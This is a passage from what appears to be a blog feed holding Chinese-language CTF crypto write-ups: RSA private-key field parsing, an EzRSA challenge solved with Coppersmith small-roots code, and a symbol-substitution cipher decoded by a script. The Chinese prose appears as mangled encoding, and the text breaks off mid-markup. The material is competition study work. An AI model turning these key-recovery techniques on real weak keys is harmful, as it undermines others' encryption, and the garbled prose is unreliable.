class="hljs-keyword">c</span><span class="hljs-number">1</span>def<span class="hljs-number">29778e8957</span><span class="hljs-keyword">c</span><span class="hljs-number">2e5</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 40ï¼š</strong> $d \mod p-1$ï¼Œé•¿åº¦0x40å³64å­—èŠ‚</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">dp</span> <span class="hljs-operator">=</span> <span class="hljs-number">62290</span>a17369fd6b8f6328752aad0738e72f74f18be7986e303b735f549a9070e1a3abc1f1e131dad9b7ba7a68716020ca6cfb69fd1716e1bfcd7de18063d73e1<br></code></pre></td></tr></table></figure><ul><li><strong>02 40ï¼š</strong> $d \mod q-1$ï¼Œé•¿åº¦åŒä¸Š</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">dq <span class="hljs-operator">=</span> <span class="hljs-number">3</span>ce<span class="hljs-number">3565</span><span class="hljs-keyword">c</span><span class="hljs-number">58388</span>ae<span class="hljs-number">1</span>af<span class="hljs-number">55</span>ea<span class="hljs-number">22</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">0</span>bc<span class="hljs-number">4</span>b<span class="hljs-number">39</span>b<span class="hljs-number">133</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>dfc<span class="hljs-number">1960497</span><span class="hljs-keyword">c</span><span class="hljs-number">6545</span>d<span class="hljs-number">4e9</span>ced<span class="hljs-number">81081</span>d<span class="hljs-number">317</span>ea<span class="hljs-number">194</span>a<span class="hljs-number">7</span>d<span class="hljs-number">090</span>cd<span class="hljs-number">454</span><span class="hljs-keyword">c</span><span class="hljs-number">2392018</span>a<span class="hljs-number">03</span>ae<span class="hljs-number">3</span>f<span class="hljs-number">0</span>efb<span class="hljs-number">9</span>a<span class="hljs-number">2847e847128</span>ba<span class="hljs-number">52</span>d<br></code></pre></td></tr></table></figure><ul><li><strong>02 41ï¼š</strong> $q^{-1}\mod p$ï¼Œé•¿åº¦åŒä¸Š</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">q_inv_p <span class="hljs-operator">=</span> <span class="hljs-number">00</span>eb<span class="hljs-number">5</span>a<span class="hljs-number">32</span>f<span class="hljs-number">31620e1</span>bb<span class="hljs-number">980467829</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>a<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">3</span>b<span class="hljs-number">2</span>f<span class="hljs-number">8</span>d<span class="hljs-number">7</span>f<span class="hljs-number">4</span>f<span class="hljs-number">42131</span>ed<span class="hljs-number">7</span>a<span class="hljs-number">289825</span>f<span class="hljs-number">0</span>aeaf<span class="hljs-number">390</span>b<span class="hljs-number">542</span><span class="hljs-keyword">c</span><span class="hljs-number">755</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>dcc<span class="hljs-number">94</span>dfaee<span class="hljs-number">609</span>fba<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">50731</span>b<span class="hljs-number">6</span>a<span class="hljs-number">1</span>d<span class="hljs-number">197</span>b<span class="hljs-number">7</span>b<span class="hljs-number">9</span>a<span class="hljs-number">91267</span>acdade<span class="hljs-number">62</span>f<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><blockquote><p>psï¼šæ³¨æ„åœ¨å¤„ç†ä¸å®Œæ•´çš„base64æ—¶ï¼Œè¦é€šè¿‡åˆ é™¤ä¸€äº›æ•°æ®æ¥ä¿è¯æ­£ç¡®è§£ç </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd å¤ç°</title>
    <link href="/2025/07/01/NSSCTF%202nd/"/>
    <url>/2025/07/01/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h2 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length()&lt;<span class="hljs-number">200</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>kbits = <span class="hljs-number">103</span><br>m = (m &gt;&gt; kbits) &lt;&lt; kbits<br>Mod = getPrime(<span class="hljs-number">1024</span>)<br>hint1 = (<span class="hljs-number">2021</span>-<span class="hljs-number">2023</span>*m) % Mod<br>hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2023</span>, Mod)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint1 =&#x27;</span>,hint1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint2 =&#x27;</span>,hint2)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span><br><span class="hljs-string">c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span><br><span class="hljs-string">hint1 = 153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span><br><span class="hljs-string">hint2 = 130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>$hint2-2^{2023}&#x3D;kM$<br>$hint1\equiv 2021-2023m \mod kM$<br>æ‰“coppersmithï¼Œå¾—åˆ°å°æ ¹mï¼Œä¹‹åä¾¿æ˜¯å·²çŸ¥æ˜æ–‡é«˜ä½ï¼Œæ¥ç€æ‰“coppersmith<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span><br>c = <span class="hljs-number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span><br>hint1 = <span class="hljs-number">153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span><br>hint2 = <span class="hljs-number">130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span><br><br>kM = hint2 - <span class="hljs-number">2</span>^<span class="hljs-number">2023</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(kM))<br>f = hint1 - <span class="hljs-number">2021</span> + <span class="hljs-number">2023</span> * x<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">200</span>,beta=<span class="hljs-number">0.44</span>)<br>m = <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(m)</span><br><br>PR.&lt;y&gt; = PolynomialRing(Zmod(n))<br>f = (m+y)^<span class="hljs-number">3</span> - c<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">103</span>,beta=<span class="hljs-number">0.44</span>)<br>M = roots[<span class="hljs-number">0</span>]+ m<br>ans = long_to_bytes(<span class="hljs-built_in">int</span>(M))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">âœ§âœ¡âœ­<br>âœ¡âœ® âœ£âœ´âœ¯ âœ¤âœ¶âœ¬âœ¬âœ± âœ¬âœ¤ âœ±âœ¦âœ¢âœ¥âœ®âœ¯âœ§âœ§, âœ´âœ¬âœ·âœ¯ âœ¡âœ§ âœ£âœ´âœ¯ âœ¶âœ¡âœ°âœ´âœ£. âœ¡âœ£ â‚âœ¢âœ¡âœ®âœ°âœ§ âœ©âœ¬âœ¸âœ¤âœ¬âœ¢âœ£, âœ¤âœ¦âœ¡âœ£âœ´, âœ¦âœ®âœ± âœ©âœ¬âœ®âœ¤âœ¡âœ±âœ¯âœ®âœ©âœ¯. âœ¡âœ£ âœ°âœ¡âœ²âœ¯âœ§ âœ³âœ§ âœ°âœ³âœ¡âœ±âœ¦âœ®âœ©âœ¯ â˜…âœ´âœ¯âœ® â˜…âœ¯ âœ¦âœ¢âœ¯ âœ¶âœ¬âœ§âœ£, âœ¦âœ®âœ± âœ°âœ¡âœ²âœ¯âœ§ âœ§âœ³âœ·âœ·âœ¬âœ¢âœ£ â˜…âœ´âœ¯âœ® â˜…âœ¯ âœ¦âœ¢âœ¯ âœ¦âœ¤âœ¢âœ¦âœ¡âœ±. âœ¦âœ®âœ± âœ£âœ´âœ¯ âœ¸âœ¬âœ¸âœ¯âœ®âœ£ â˜…âœ¯ âœ°âœ¡âœ²âœ¯ âœ³âœ· âœ´âœ¬âœ·âœ¯, â˜…âœ¯ âœ°âœ¡âœ²âœ¯ âœ³âœ· âœ¬âœ³âœ¢ âœ¶âœ¡âœ²âœ¯âœ§. âœ£âœ´âœ¯ â˜…âœ¬âœ¢âœ¶âœ± â˜…âœ¯ âœ¶âœ¡âœ²âœ¯ âœ¡âœ® âœ¡âœ§ âœ±âœ¡âœ§âœ¡âœ®âœ£âœ¯âœ°âœ¢âœ¦âœ£âœ¡âœ®âœ° âœ¡âœ®âœ£âœ¬ âœ¦ âœ·âœ¶âœ¦âœ©âœ¯ âœ¬âœ¤ âœ¸âœ¦âœ¶âœ¡âœ©âœ¯ âœ¦âœ®âœ± âœ´âœ¦âœ£âœ¢âœ¯âœ±, â˜…âœ´âœ¯âœ¢âœ¯ â˜…âœ¯ âœ®âœ¯âœ¯âœ± âœ´âœ¬âœ·âœ¯ âœ¦âœ®âœ± âœ¤âœ¡âœ®âœ± âœ¡âœ£ âœ´âœ¦âœ¢âœ±âœ¯âœ¢. âœ¡âœ® âœ£âœ´âœ¡âœ§ â˜…âœ¬âœ¢âœ¶âœ± âœ¬âœ¤ âœ¤âœ¯âœ¦âœ¢, âœ´âœ¬âœ·âœ¯ âœ£âœ¬ âœ¤âœ¡âœ®âœ± â‚âœ¯âœ£âœ£âœ¯âœ¢, â‚âœ³âœ£ âœ¯âœ¦âœ§âœ¡âœ¯âœ¢ âœ§âœ¦âœ¡âœ± âœ£âœ´âœ¦âœ® âœ±âœ¬âœ®âœ¯, âœ£âœ´âœ¯ âœ¸âœ¬âœ¢âœ¯ âœ¸âœ¯âœ¦âœ®âœ¡âœ®âœ°âœ¤âœ³âœ¶ âœ¶âœ¡âœ¤âœ¯ âœ¬âœ¤ âœ¤âœ¦âœ¡âœ£âœ´ â˜…âœ¡âœ¶âœ¶ âœ¸âœ¦âœ¥âœ¯ âœ¶âœ¡âœ¤âœ¯ âœ¸âœ¯âœ¦âœ®âœ¡âœ®âœ°âœ¤âœ³âœ¶.<br>âœ§âœ¬âœ¸âœ¯âœ£âœ¡âœ¸âœ¯âœ§ â˜…âœ¯ âœ£âœ´âœ¡âœ®âœ¥ âœ¬âœ¤ âœ±âœ¢âœ¯âœ¦âœ¸âœ§ âœ¦âœ§ âœ¤âœ¦âœ®âœ£âœ¦âœ§âœ¡âœ¯âœ§ - âœ¡âœ£&#x27;âœ§ âœ¯âœ¦âœ§âœµ âœ£âœ¬ âœ±âœ¬ â˜…âœ´âœ¯âœ® âœµâœ¬âœ³ âœ´âœ¦âœ²âœ¯ âœ¸âœ¬âœ®âœ¯âœµ, âœ¢âœ¯âœ®âœ£, âœ¦âœ®âœ± â˜…âœ¬âœ¢âœ¥. â‚âœ³âœ£ âœµâœ¬âœ³ âœ©âœ¦âœ®&#x27;âœ£ âœ·âœ¢âœ¯âœ·âœ¦âœ¢âœ¯ âœµâœ¬âœ³âœ¢âœ§âœ¯âœ¶âœ¤ âœ¦âœ®âœ± âœ«âœ³âœ¸âœ· âœ¬âœ¤âœ¤ âœ£âœ´âœ¯ âœ©âœ¶âœ¡âœ¤âœ¤: âœµâœ¬âœ³ âœ§âœ´âœ¬âœ³âœ¶âœ± âœ°âœ¢âœ¬â˜… âœµâœ¬âœ³âœ¢ â˜…âœ¡âœ®âœ°âœ§ âœ¤âœ¡âœ¢âœ§âœ£. âœ¦ âœ¶âœ¡âœ£âœ£âœ¶âœ¯ â‚âœ¡âœ£ âœ£âœ¬â˜…âœ¦âœ¢âœ± âœ£âœ´âœ¯ âœ±âœ¢âœ¯âœ¦âœ¸. âœ§âœ£âœ¯âœ· â‚âœµ âœ§âœ£âœ¯âœ·. âœ£âœ¦âœ¥âœ¯ âœ¦ âœ§âœ£âœ¯âœ· âœ¤âœ¬âœ¢â˜…âœ¦âœ¢âœ±. âœ¦âœ¤âœ£âœ¯âœ¢ âœ¦âœ¶âœ¶, âœ¡âœ£&#x27;âœ§ âœµâœ¬âœ³âœ¢ âœ¸âœ¡âœ§âœ§âœ¡âœ¬âœ®.<br>âœ¥âœ¯âœ¯âœ· âœ¤âœ¦âœ¡âœ£âœ´ âœ¦âœ®âœ± âœ´âœ¬âœ·âœ¯ âœ¤âœ¬âœ¢ âœ£âœ´âœ¯ âœ¤âœ³âœ£âœ³âœ¢âœ¯. âœ¸âœ¦âœ¥âœ¯ âœµâœ¬âœ³âœ¢ âœ¸âœ¬âœ§âœ£ âœ§âœ¡âœ®âœ©âœ¯âœ¢âœ¯ âœ±âœ¢âœ¯âœ¦âœ¸âœ§, âœ¦âœ®âœ± â˜…âœ´âœ¯âœ® âœ£âœ´âœ¯ âœ¬âœ·âœ·âœ¬âœ¢âœ£âœ³âœ®âœ¡âœ£âœ¡âœ¯âœ§ âœ©âœ¬âœ¸âœ¯, âœ£âœ´âœ¯âœµ â˜…âœ¡âœ¶âœ¶ âœ¤âœ¡âœ°âœ´âœ£ âœ¤âœ¬âœ¢ âœ£âœ´âœ¯âœ¸. âœ¡âœ£ âœ¸âœ¦âœµ âœ£âœ¦âœ¥âœ¯ âœ¦ âœ§âœ¯âœ¦âœ§âœ¬âœ® âœ¬âœ¢ âœ¸âœ¬âœ¢âœ¯, â‚âœ³âœ£ âœ£âœ´âœ¯ âœ¯âœ®âœ±âœ¡âœ®âœ° â˜…âœ¡âœ¶âœ¶ âœ®âœ¬âœ£ âœ©âœ´âœ¦âœ®âœ°âœ¯. âœ¦âœ¸â‚âœ¡âœ£âœ¡âœ¬âœ®, â‚âœ¯âœ§âœ£, â‚âœ¯âœ©âœ¬âœ¸âœ¯ âœ¦ âœ¢âœ¯âœ¦âœ¶âœ¡âœ£âœµ. âœ¦âœ® âœ³âœ®âœ©âœ¯âœ¢âœ£âœ¦âœ¡âœ® âœ¤âœ³âœ£âœ³âœ¢âœ¯, âœ¬âœ®âœ¶âœµ âœ¬âœ®âœ¯ âœ§âœ£âœ¯âœ· âœ¦âœ£ âœ¦ âœ£âœ¡âœ¸âœ¯, âœ£âœ´âœ¯ âœ´âœ¬âœ·âœ¯ âœ©âœ¦âœ® âœ¢âœ¯âœ¦âœ¶âœ¡âœªâœ¯ âœ£âœ´âœ¯ âœ±âœ¢âœ¯âœ¦âœ¸ âœ¬âœ¤ âœ£âœ´âœ¯ âœ´âœ¡âœ°âœ´âœ¯âœ§âœ£. â˜…âœ¯ âœ¸âœ³âœ§âœ£ âœ£âœ¢âœ¯âœ¦âœ§âœ³âœ¢âœ¯ âœ£âœ´âœ¯ âœ±âœ¢âœ¯âœ¦âœ¸, âœ£âœ¬ âœ·âœ¢âœ¬âœ£âœ¯âœ©âœ£ âœ¡âœ£ âœ¦ âœ§âœ¯âœ¦âœ§âœ¬âœ®, âœ¶âœ¯âœ£ âœ¡âœ£ âœ¡âœ® âœ£âœ´âœ¯ âœ´âœ¯âœ¦âœ¢âœ£ â‹âœ³âœ¡âœ¯âœ£âœ¶âœµ âœ°âœ¯âœ¢âœ¸âœ¡âœ®âœ¦âœ¶.<br>âœ¬âœ®âœ¶âœµ â˜…âœ´âœ¯âœ® âœµâœ¬âœ³ âœ³âœ®âœ±âœ¯âœ¢âœ§âœ£âœ¦âœ®âœ± âœ£âœ´âœ¯ âœ£âœ¢âœ³âœ¯ âœ¸âœ¯âœ¦âœ®âœ¡âœ®âœ° âœ¬âœ¤ âœ¶âœ¡âœ¤âœ¯ âœ©âœ¦âœ® âœµâœ¬âœ³ âœ¶âœ¡âœ²âœ¯ âœ£âœ¢âœ³âœ¶âœµ. â‚âœ¡âœ£âœ£âœ¯âœ¢âœ§â˜…âœ¯âœ¯âœ£ âœ¦âœ§ âœ¶âœ¡âœ¤âœ¯ âœ¡âœ§, âœ¡âœ£&#x27;âœ§ âœ§âœ£âœ¡âœ¶âœ¶ â˜…âœ¬âœ®âœ±âœ¯âœ¢âœ¤âœ³âœ¶, âœ¦âœ®âœ± âœ¡âœ£&#x27;âœ§ âœ¤âœ¦âœ§âœ©âœ¡âœ®âœ¦âœ£âœ¡âœ®âœ° âœ¯âœ²âœ¯âœ® âœ¡âœ® âœ£âœ¢âœ¦âœ°âœ¯âœ±âœµ. âœ¡âœ¤ âœµâœ¬âœ³&#x27;âœ¢âœ¯ âœ«âœ³âœ§âœ£ âœ¦âœ¶âœ¡âœ²âœ¯, âœ£âœ¢âœµ âœ´âœ¦âœ¢âœ±âœ¯âœ¢ âœ¦âœ®âœ± âœ£âœ¢âœµ âœ£âœ¬ âœ¶âœ¡âœ²âœ¯ â˜…âœ¬âœ®âœ±âœ¯âœ¢âœ¤âœ³âœ¶âœ¶âœµ.<br>âœ¡ â‚âœ¯âœ¶âœ¡âœ¯âœ²âœ¯ âœ£âœ´âœ¯âœ¢âœ¯ âœ¡âœ§ âœ¦ âœ·âœ¯âœ¢âœ§âœ¬âœ® â˜…âœ´âœ¬ â‚âœ¢âœ¡âœ®âœ°âœ§ âœ§âœ³âœ®âœ§âœ´âœ¡âœ®âœ¯ âœ¡âœ®âœ£âœ¬ âœµâœ¬âœ³âœ¢ âœ¶âœ¡âœ¤âœ¯. âœ£âœ´âœ¦âœ£ âœ·âœ¯âœ¢âœ§âœ¬âœ® âœ¸âœ¦âœµ âœ´âœ¦âœ²âœ¯ âœ¯âœ®âœ¬âœ³âœ°âœ´ âœ£âœ¬ âœ§âœ·âœ¢âœ¯âœ¦âœ± âœ¦âœ¢âœ¬âœ³âœ®âœ±. â‚âœ³âœ£ âœ¡âœ¤ âœµâœ¬âœ³ âœ¢âœ¯âœ¦âœ¶âœ¶âœµ âœ´âœ¦âœ²âœ¯ âœ£âœ¬ â˜…âœ¦âœ¡âœ£ âœ¤âœ¬âœ¢ âœ§âœ¬âœ¸âœ¯âœ¬âœ®âœ¯ âœ£âœ¬ â‚âœ¢âœ¡âœ®âœ° âœµâœ¬âœ³ âœ£âœ´âœ¯ âœ§âœ³âœ® âœ¦âœ®âœ± âœ°âœ¡âœ²âœ¯ âœµâœ¬âœ³ âœ¦ âœ°âœ¬âœ¬âœ± âœ¤âœ¯âœ¯âœ¶âœ¡âœ®âœ°, âœ£âœ´âœ¯âœ® âœµâœ¬âœ³ âœ¸âœ¦âœµ âœ´âœ¦âœ²âœ¯ âœ£âœ¬ â˜…âœ¦âœ¡âœ£ âœ¦ âœ¶âœ¬âœ®âœ° âœ£âœ¡âœ¸âœ¯.<br>âœ¡âœ® âœ¦ â˜…âœ¬âœ¢âœ±,âœ¡ âœ´âœ¬âœ·âœ¯ âœµâœ¬âœ³ â˜…âœ¡âœ¶âœ¶ âœ¶âœ¡âœ¥âœ¯ âœ©âœ¢âœµâœ·âœ£âœ¬âœ°âœ¢âœ¦âœ·âœ´âœµ.âœ£âœ´âœ¡âœ§ âœ¡âœ§ âœµâœ¬âœ³âœ¢ âœ¤âœ¶âœ¦âœ°:âœ®âœ§âœ§âœ©âœ£âœ¤&#123;âœ©âœ¢âœµâœ·âœ£âœ¬_âœ¡âœ§_âœ§âœ¬_âœ¡âœ®âœ£âœ¯âœ¢âœ¯âœ§âœ£âœ¡âœ®âœ°_â˜…âœ´âœµ_âœ±âœ¬âœ®&#x27;âœ£_âœµâœ¬âœ³_âœ«âœ¬âœ¡âœ®_âœ³âœ§&#125;<br><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æ ¹æ®æ–‡æœ«çš„æ ¼å¼ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ç®€å•æ›¿æ¢å¯†ç ï¼Œé¦–å…ˆå°†å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå›¾å½¢éƒ½è½¬æ¢æˆä¸€ä¸ªå”¯ä¸€å¯¹åº”çš„å­—æ¯ï¼Œä¹‹åå†åœ¨quipquipä¸­è¿è¡Œå³å¯å¾—åˆ°æ˜æ–‡ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ciphertext.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>strings = file.read()<br><span class="hljs-built_in">print</span>(strings)<br><br><span class="hljs-comment"># è¿‡æ»¤æ‰å¸¸è§çš„è‹±æ–‡ã€æ•°å­—ã€ç©ºæ ¼ã€æ ‡ç‚¹å’Œæ¢è¡Œ</span><br>normal_ascii = <span class="hljs-built_in">set</span>(string.ascii_letters + string.digits + <span class="hljs-string">&quot; ,.&#x27;-:;[]&#123;&#125;()_\&quot;/\\\n&quot;</span>)<br><br>special_chars = []<br>seen = <span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> strings:<br>    <span class="hljs-keyword">if</span> ch <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> normal_ascii <span class="hljs-keyword">and</span> ch <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:<br>        special_chars.append(ch)<br>        seen.add(ch)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_letter_labels</span>(<span class="hljs-params">n</span>):<br>    labels = []<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(labels) &lt; n:<br>        s = <span class="hljs-string">&#x27;&#x27;</span><br>        t = i<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            s = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + (t % <span class="hljs-number">26</span>)) + s<br>            t = t // <span class="hljs-number">26</span> - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>        labels.append(s)<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> labels<br><br>labels = gen_letter_labels(<span class="hljs-built_in">len</span>(special_chars))<br>replace_map = &#123;ch: labels[i] <span class="hljs-keyword">for</span> i, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(special_chars)&#125;<br><br><span class="hljs-comment"># æ›¿æ¢å‡½æ•°</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_icons</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">for</span> ch, repl <span class="hljs-keyword">in</span> replace_map.items():<br>        s = s.replace(ch, repl)<br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># è¾“å‡ºæ˜ å°„è¡¨</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç‰¹æ®Šå­—ç¬¦æ˜ å°„ï¼š&quot;</span>)<br><span class="hljs-keyword">for</span> ch, l <span class="hljs-keyword">in</span> replace_map.items():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;&#x27;<span class="hljs-subst">&#123;ch&#125;</span>&#x27;: &#x27;<span class="hljs-subst">&#123;l&#125;</span>&#x27;&quot;</span>)<br><br><span class="hljs-comment"># æ›¿æ¢ç»“æœ</span><br>c_replaced = replace_icons(strings)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\næ›¿æ¢åçš„æ–‡æœ¬:\n&quot;</span>)<br><span class="hljs-built_in">print</span>(c_replaced)<br></code></pre></td></tr></table></figure><p><img src="/2025/07/01/NSSCTF%202nd/file-20250630112051419.png"></p><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 